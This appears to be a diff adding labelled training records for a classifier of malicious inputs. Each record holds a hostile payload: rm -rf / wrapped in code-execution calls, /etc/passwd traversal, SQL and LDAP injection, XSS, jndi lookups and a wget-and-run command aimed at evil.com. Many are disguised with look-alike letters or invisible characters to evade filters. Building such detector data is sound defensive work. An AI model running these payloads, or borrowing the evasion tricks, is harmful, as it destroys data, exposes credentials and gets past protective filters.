+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION\\x20\\x20SELECT\\x20\\x20null,\\x20\\x20null,\\x20\\x20null\\x20\\x20FROM\\x20\\x20information_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  information_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP\\x20TABLE\\x20users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.423215"}
+{"text": "wget​ http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && ​/tmp/x", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget​ http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && /tmp/x", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "UNION  SELECT  null,  null,  null  FROM  informаtion_schema.tables", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')​", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "java.lang.Runtime.getRuntime().exec('rm​\\x20-rf\\x20/')", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "wget    http://evil.cоm/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "timestamp": "2025-12-12T17:23:20.847883"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.422731"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLе  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "label": 1, "source": "weakness_analysis_bypass", "original_bypass": "wget    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "timestamp": "2025-12-12T17:23:20.847883"}
